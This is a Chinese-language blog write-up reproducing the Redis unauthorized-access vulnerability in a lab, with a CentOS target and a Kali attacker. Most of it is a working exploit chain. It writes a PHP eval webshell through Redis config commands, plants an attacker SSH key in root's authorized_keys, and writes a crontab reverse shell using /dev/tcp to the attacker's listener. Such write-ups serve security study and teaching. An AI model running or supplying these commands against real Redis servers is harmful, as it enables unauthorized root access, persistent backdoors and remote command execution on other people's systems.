---
title: 漏洞复现-Redis未授权访问
tags: 
  - 漏洞复现
  - Redis
  - 未授权
  - 写shell
  - SSH公钥认证
categories: 漏洞复现
keywords: '漏洞复现,Redis,未授权,写shell,SSH公钥认证'
description: 漏洞复现-Redis未授权访问
cover: /images/14/7.png
date: 2020-11-29 11:37:12
---



# Redis概念
redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set --有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。

Redis 是一个高性能的key-value数据库。 redis的出现，很大程度补偿了memcached这类key/value存储的不足，在部 分场合可以对关系数据库起到很好的补充作用。它提供了Java，C/C++，C#，PHP，JavaScript，Perl，Object-C，Python，Ruby，Erlang等客户端，使用很方便。
<!--more-->

# Redis未授权访问
redis 默认情况下，会绑定在 0.0.0.0:6379，，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作。

漏洞产生条件	
>1、	redis服务绑定在6379端口并且该端口可以被访问到
2、	没有设置密码认证（一般为空），可以免密码远程登录redis服务。
# 环境准备
靶机：	
Centos7：192.168.229.157
![upload successful](/images/14/1.png) 
攻击机：	
Kali：192.168.229.128
![upload successful](/images/14/2.png)  
# 环境搭建
1、首先下载redis的压缩包	
```
wget http://download.redis.io/releases/redis-2.8.17.tar.gz
```
![upload successful](/images/14/3.png) 

2、解压压缩包，进入指定路径redis-2.8.17，进行安装
```
tar xzf redis-2.8.17.tar.gz
cd redis-2.8.17
make
```
![upload successful](/images/14/4.png) 

3、进入到src路径，将redis-server和redis-cli拷贝到/usr/bin目录下，后续方便直接启动redis服务器并且将redis-2.8.17目录下面的redis.conf拷贝到/etc下面。
```
cd src
cp redis-server /usr/bin
cp redis-cli /usr/bin
cp redis.conf /etc/redis.conf
```
![upload successful](/images/14/5.png) 

4、启动服务
```
redis-server /etc/redis.conf
```
![upload successful](/images/14/6.png) 


# 漏洞复现
## 写入webshell
1、首先尝试无密码连接redis，未报错表示连接成功
```
redis-cli -h 192.168.229.157
```
![upload successful](/images/14/7.png) 

2、写入webhsell
```
redis-cli -h 192.168.229.157
config set dir /home/
config set dbfilename 8.php
set webshell "<?php eval($_POST[1]);?>"
save
```
![upload successful](/images/14/8.png) 

3、在服务器查看文件，确实写入了webshell
![upload successful](/images/14/9.png) 


## 利用“公私钥”认证获得root权限

1、 kali攻击机未授权访问连接
```
redis-cli -h 192.168.163.157
keys *
```

![upload successful](/images/14/10.png) 

2、在攻击机中生成ssh公钥和私钥，密码设置为空（一路回车即可）
```
ssh-keygen -t rsa
```
![upload successful](/images/14/11.png) 

3、进入.ssh目录，将生成的公钥保存到1.txt
```
cd /root/.ssh
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > 1.txt
```
![upload successful](/images/14/12.png) 


4、将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）
```
cat 1.txt | redis-cli -h 192.168.229.157 -x set crack
```
![upload successful](/images/14/13.png) 

5、使用 CONFIG GET dir 命令得到redis备份的路径
```
CONFIG GET dir
```
![upload successful](/images/14/14.png) 

6、更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）,并且修改上传公钥文件的名称为authorized_keys。
```
config set dir /root/.ssh
  这里设置目录时，可能存在(error) ERR Changing directory: No such file or directory
  这是因为root从来没有登录过，在被攻击机执行ssh localhost 即可
  (error) ERR Changing directory: Permission denied
  说明redis并不是以root启动的，在被攻击机重新使用sudo开启redis服务即可
CONFIG SET dbfilename authorized_keys
save
```
![upload successful](/images/14/15.png) 

查看攻击机也已经成功生成了公钥文件
![upload successful](/images/14/16.png) 

7、使用ssh免密码登录redis服务器
```
ssh -i id_rsa root@192.168.229.157
```
![upload successful](/images/14/17.png) 

## 利用计划任务反弹shell
1、首先kali机器进行开启监听
![upload successful](/images/14/18.png) 

2、使用redis通过crontab进行反弹shell
```
set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.229.128/4455 0>&1\n\n"
config set dir /var/spool/cron
config set dbfilename root
save
```
![upload successful](/images/14/19.png) 

3、查看反弹shell命令已经成功写入了
![upload successful](/images/14/20.png) 

4、攻击机也成功获取了shell
![upload successful](/images/14/21.png) 

